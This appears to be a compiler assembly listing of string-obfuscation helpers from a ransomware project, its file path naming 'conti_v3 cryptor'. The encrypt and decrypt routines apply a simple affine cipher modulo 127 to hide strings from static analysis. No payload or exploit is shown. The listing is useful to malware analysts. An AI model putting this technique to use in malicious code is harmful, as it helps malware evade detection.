?encrypt@?$MetaBuffer@$04$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z PROC ; MetaBuffer<5,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 8d 04 85 65
	00 00 00	 lea	 r8d, DWORD PTR [rax*4+101]
  0000b	44 03 c0	 add	 r8d, eax
  0000e	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  00013	41 f7 e0	 mul	 r8d
  00016	41 8b c8	 mov	 ecx, r8d
  00019	2b ca		 sub	 ecx, edx
  0001b	d1 e9		 shr	 ecx, 1
  0001d	03 ca		 add	 ecx, edx
  0001f	c1 e9 06	 shr	 ecx, 6
  00022	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00025	44 2b c1	 sub	 r8d, ecx
  00028	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  0002c	c3		 ret	 0
?encrypt@?$MetaBuffer@$04$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<5,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$04$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$04$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEBA_NXZ PROC ; MetaBuffer<5,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$04$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<5,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DN@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0DN@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z PROC ; MetaBuffer<61,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 24	 sub	 eax, 36			; 00000024H
  00006	44 6b c0 19	 imul	 r8d, eax, 25

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DN@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<61,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0DN@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0DN@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z PROC ; MetaBuffer<61,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 3d	 imul	 r8d, eax, 61		; 0000003dH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 24	 add	 r8d, 36			; 00000024H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0DN@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<61,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0DN@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0DN@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEBA_NXZ PROC ; MetaBuffer<61,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0DN@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<61,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::isDecrypted
_TEXT	ENDS
END
